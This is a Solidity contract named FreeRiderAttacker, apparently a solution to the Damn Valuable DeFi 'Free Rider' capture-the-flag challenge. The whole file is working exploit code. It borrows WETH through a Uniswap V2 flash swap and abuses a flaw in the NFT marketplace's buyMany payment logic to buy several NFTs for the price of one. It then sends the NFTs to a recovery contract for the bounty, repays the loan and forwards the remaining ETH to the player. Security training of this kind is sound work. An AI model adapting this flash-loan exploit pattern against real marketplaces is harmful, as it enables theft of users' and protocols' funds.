// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair private immutable _pair;
    IUniswapV2Factory private immutable _factory;
    FreeRiderNFTMarketplace private immutable _marketPlace;
    FreeRiderRecovery private immutable _recovery;
    IWETH private immutable _weth;
    DamnValuableNFT private immutable _nft;
    uint256[] private _tokenIds;
    uint256 public constant NFT_PRICE = 15 ether;
    uint256 public constant NFT_PRICE_WITH_FEE = (NFT_PRICE * 1000) / 997 + 1;
    address private _player;

    constructor(
        IUniswapV2Pair pair,
        IUniswapV2Factory factory,
        FreeRiderNFTMarketplace marketPlace,
        FreeRiderRecovery recovery,
        uint256[] memory tokenIds
    ) {
        _pair = pair;
        _factory = factory;
        _marketPlace = marketPlace;
        _recovery = recovery;
        _nft = marketPlace.token();
        _player = msg.sender;

        _weth = IWETH(payable(pair.token0()));

        _tokenIds = tokenIds;
    }

    function attack() external {
        _pair.swap(NFT_PRICE, 0, address(this), abi.encode(_player)); // flash swap
    }

    // This is the callback called by uniswap flash swap
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender == IUniswapV2Factory(_factory).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair

        // convert weth to eth
        _weth.withdraw(amount0);

        // buy many for the price of one because of the vulnerability
        _marketPlace.buyMany{value: amount0}(_tokenIds);

        // sending nft back to the recovery contract, this will trigger
        for (uint256 i = 0; i < _tokenIds.length; ) {
            unchecked {
                _nft.safeTransferFrom(
                    address(this),
                    address(_recovery),
                    _tokenIds[i],
                    data
                );
                ++i;
            }
        }

        // convert back to weth
        _weth.deposit{value: NFT_PRICE_WITH_FEE}();

        // repay WETH to Uniswap V2 pair
        assert(_weth.transfer(msg.sender, NFT_PRICE_WITH_FEE));

        // send all remaining eth to player
        payable(_player).send(address(this).balance);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory _data
    ) external override returns (bytes4) {
        // nothing specific to do this is required by the ERC721.safeTransferfrom
        return IERC721Receiver.onERC721Received.selector;
    }
}
